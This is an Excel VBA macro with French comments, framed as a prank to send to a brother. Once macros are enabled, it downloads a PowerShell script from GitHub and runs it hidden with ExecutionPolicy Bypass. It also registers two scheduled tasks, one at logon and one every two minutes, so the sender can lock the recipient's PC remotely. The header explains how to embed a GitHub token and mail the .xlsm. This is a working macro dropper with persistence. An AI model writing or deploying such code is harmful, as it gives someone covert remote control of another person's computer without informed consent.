' ================================================================
' BLAGUE VERROU — Macro Excel
'
' Mode d'emploi pour TOI (avant d'envoyer) :
'   1. Ouvrir Excel -> Alt+F11 -> Inserer -> Module
'   2. Coller ce code
'   3. Remplir GITHUB_TOKEN et CODE_SECRET ci-dessous
'   4. Fichier -> Enregistrer sous -> Format : Classeur Excel (xlsm)
'   5. Envoyer le .xlsm a ton frere
'
' Ce que voit TON FRERE en ouvrant le fichier :
'   - Excel demande d'activer les macros
'   - Il clique "Activer" -> la macro tourne -> il voit le message
'   - Des ce moment, tu peux le bloquer depuis Google Sheets
' ================================================================

Sub BlagueVerrou()

    ' ============================================================
    ' A PERSONNALISER AVANT D'ENVOYER
    Const GITHUB_TOKEN  As String = "REMPLACER_PAR_TON_TOKEN_GITHUB"
    Const CODE_SECRET   As String = "REMPLACER_PAR_TON_CODE_SECRET"
    ' ============================================================
    Const OWNER         As String = "thesangu"
    Const REPO          As String = "Aventuuuure"
    Const BRANCH        As String = "main"
    Const LOCK_PATH     As String = "data/blague_lock.json"
    Const SCRIPT_URL    As String = "https://raw.githubusercontent.com/thesangu/Aventuuuure/main/tools/blague_lock_windows.ps1"

    Dim dossier As String
    dossier = Environ("APPDATA") & "\BlagueVerrou"
    If Dir(dossier, vbDirectory) = "" Then MkDir dossier

    ' --- Telecharger le script PowerShell depuis GitHub ---
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", SCRIPT_URL, False
    http.send
    If http.Status <> 200 Then
        MsgBox "Erreur telechargement script (" & http.Status & "). Verifie ta connexion.", vbCritical
        Exit Sub
    End If

    Dim f As Integer
    f = FreeFile
    Open dossier & "\blague_lock_windows.ps1" For Output As #f
    Print #f, http.responseText
    Close #f

    ' --- Ecrire la config ---
    Dim config As String
    config = "{" & _
        """token"":""" & GITHUB_TOKEN & """," & _
        """owner"":""" & OWNER & """," & _
        """repo"":""" & REPO & """," & _
        """branch"":""" & BRANCH & """," & _
        """lock_path"":""" & LOCK_PATH & """," & _
        """code_secret"":""" & CODE_SECRET & """}"

    f = FreeFile
    Open dossier & "\blague_config.json" For Output As #f
    Print #f, config
    Close #f

    ' --- Commande PowerShell ---
    Dim psScript As String
    psScript = dossier & "\blague_lock_windows.ps1"
    Dim psCmd As String
    psCmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psScript & """"

    ' --- Tache planifiee au demarrage (redemarrage auto) ---
    Shell "cmd /c schtasks /create /tn ""BlagueVerrou"" /tr """ & psCmd & """ /sc onlogon /ru """ & Environ("USERNAME") & """ /f", vbHide

    ' --- Tache toutes les 2 minutes (remplace le ""gardien"") ---
    Shell "cmd /c schtasks /create /tn ""BlagueVerrouGardien"" /tr """ & psCmd & """ /sc minute /mo 2 /ru """ & Environ("USERNAME") & """ /f", vbHide

    ' --- Lancement immediat ---
    Shell psCmd, vbHide

    ' --- Message pour le frere ---
    MsgBox "Bienvenue dans la matrice. 😊" & vbCrLf & vbCrLf & _
           "Ton grand frere peut desormais bloquer ton PC" & vbCrLf & _
           "quand il veut, depuis n'importe ou." & vbCrLf & vbCrLf & _
           "Score actuel : 2 - 1. A toi de jouer... si tu peux.", _
           vbInformation, "Trop tard."

End Sub
